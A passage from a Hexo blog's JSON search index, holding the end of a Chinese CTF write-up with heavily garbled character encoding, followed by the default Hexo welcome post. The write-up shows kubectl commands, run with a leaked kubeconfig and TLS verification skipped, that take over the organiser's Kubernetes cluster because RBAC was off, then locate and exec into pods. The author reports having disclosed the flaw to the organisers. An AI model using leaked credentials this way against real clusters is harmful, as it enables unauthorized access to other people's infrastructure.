--insecure-skip-tls-verify&#x3D;true\n\nè‡³æ­¤ï¼Œæˆ‘ä»¬æ‰€èŽ·å¾—çš„æƒé™å…¶å®žå·²ç»å’Œä¸»åŠžæ–¹è¿ç»´åŒæ ·é«˜äº†ã€‚ã€‚\n0x07 èŽ·å–flagé€šè¿‡ä»¥ä¸Šçš„æ­¥éª¤ï¼Œå¤§æ¦‚æ˜Žç™½äº†è¿™æ˜¯ä¸€ä¸ªéžé¢„æœŸï¼Œå¹³å°é…ç½®tokençš„æ³„éœ²å¤–åŠ æ²¡æœ‰å¼€å¯RBACæŽˆæƒï¼Œå¯¼è‡´æˆ‘ä»¬è½»æ˜“çš„å°±èƒ½å¤ŸèŽ·å–åˆ°äº†k8sé›†ç¾¤çš„æœ€é«˜æƒé™ã€‚å› æ­¤æˆ‘ä»¬ä¹Ÿå°±èŽ·å¾—äº†è¯¥é›†ç¾¤ä¸­æ‰€æœ‰é¢˜ç›®å®¹å™¨çš„æœ€é«˜æƒé™ã€‚\nåœ¨æ•´ä¸ªé›†ç¾¤ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¯»æ‰¾å±žäºŽæˆ‘ä»¬é˜Ÿä¼çš„podï¼Œä»¥ä¾¿èŽ·å¾—å¯¹åº”çš„flagã€‚\nå› æ­¤æˆ‘ä»¬é¦–å…ˆé€šè¿‡æŸ¥è¯¢åœ¨k8sä¸­ç”¨äºŽæœåŠ¡æš´éœ²çš„serviceä¿¡æ¯ï¼š\nkubectl --kubeconfig k8s.yaml get services -n default --insecure-skip-tls-verify&#x3D;true\n\n\nå¯ä»¥çœ‹åˆ°ï¼Œåˆ—å‡ºäº†æ‰€æœ‰çš„serviceï¼ŒåŒæ—¶è¿˜æœ‰é›†ç¾¤ipä»¥åŠç«¯å£æ˜ å°„çš„å…³ç³»ã€‚è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æš´éœ²åœ¨å…¬ç½‘ä¸Šçš„ç«¯å£ï¼Œæ¥å®šä½å¯¹åº”çš„serviceã€‚\nä¾‹å¦‚æˆ‘ä»¬çš„å…¬ç½‘ç«¯å£ä¸º30067ï¼Œåˆ™æˆ‘ä»¬æœç´¢30067ç«¯å£\n\nå¾—åˆ°äº†æˆ‘ä»¬é¢˜ç›®podæ‰€åœ¨çš„serviceï¼ŒæŽ¥ç€æˆ‘ä»¬èŽ·å–è¿™ä¸ªserviceçš„è¯¦ç»†ä¿¡æ¯ï¼Œä»¥ä¾¿å¾—åˆ°pod nameï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š\nkubectl --kubeconfig k8s.yaml describe service guosai-34-15-service-c521637e -n default --insecure-skip-tls-verify&#x3D;true\n\n\nä»Žè¿™é‡Œå¤§è‡´å¯ä»¥çœ‹å‡ºï¼Œappåä¸ºguosai-34-15ï¼Œå› æ­¤æˆ‘ä»¬ç›¸åº”çš„åŽ»æ‰€æœ‰çš„podä¸­å¯»æ‰¾åä¸ºè¿™ä¸€é¡¹çš„podã€‚\nkubectl --kubeconfig k8s.yaml describe pods guosai-34-15-service-c521637e -n default --insecure-skip-tls-verify&#x3D;true\n\né€šè¿‡å¯¹æˆ‘ä»¬èŽ·å–çš„æ•°æ®çš„æ£€ç´¢ï¼Œå‘çŽ°äº†è¿™æ ·ä¸€ä¸ªpodï¼Œé€šè¿‡æ¯”è¾ƒè™šæ‹Ÿipä¸Žphpinfoä¸­çš„ä¿¡æ¯ï¼Œå¯ä»¥ç¡®å®šè¿™ä¸ªpodå°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„é‚£ä¸ªã€‚\n\nå› æ­¤ä¾¿å¾—åˆ°äº†å±žäºŽæˆ‘ä»¬çš„podã€‚execè¿›å…¥podåŽï¼Œä¾¿å¯ä»¥å¾—åˆ°flagã€‚\n0x08 æ€»ç»“åœ¨æ‹¿ä¸‹masterä¹‹åŽï¼Œæˆ‘ä»¬ç«‹å³è”ç³»äº†èµ›äº‹ä¸»åŠžæ–¹ï¼Œç»è¿‡ç¡®è®¤è¿™æ˜¯ä¸€ä¸ªå¹³å°çš„ä¸¥é‡å®‰å…¨æ¼æ´ž~ä¹Ÿå¾—åˆ°äº†ä¸»åŠžæ–¹çš„æ„Ÿè°¢ã€‚\n\n\n\nä¹‹å‰å­¦ä¹ äº‘åŽŸç”Ÿæž¶æž„å’Œå®‰å…¨ç›¸å…³çŸ¥è¯†çš„æ—¶å€™ï¼Œä¸€ç›´æ‰¾ä¸åˆ°ä¸€ä¸ªå¾ˆå¥½çš„å®žè·µæ–¹å¼ï¼Œè€Œè¿™æ¬¡åŽä¸ºäº‘ä¸“åœºæ¯”èµ›CLOUDç¬¬ä¸€æ¬¡è®©æˆ‘æŽ¥è§¦åˆ°äº†çœŸæ­£çš„â˜ï¸äº‘çŽ¯å¢ƒä¸‹çš„å®‰å…¨é—®é¢˜ï¼Œè™½è¯´æ˜¯é€šè¿‡éžé¢„æœŸçš„æ–¹å¼è§£å‡ºäº†é¢˜ç›®ï¼Œä¸è¿‡è¿™ä¸ªéžé¢„æœŸå´è®©æˆ‘ä»¬è¾ƒä¸ºå®¹æ˜“çš„æ‹¿åˆ°äº†æ•´ä¸ªé›†ç¾¤çš„æœ€é«˜æƒé™ï¼Œè¿˜æ˜¯æŒºæ„å¤–çš„ã€‚\n","categories":[],"tags":["CTF WriteUp"]},{"title":"Hello World","url":"/20201001/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new \"My New Post\"\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","categories":[],"tags":[]}]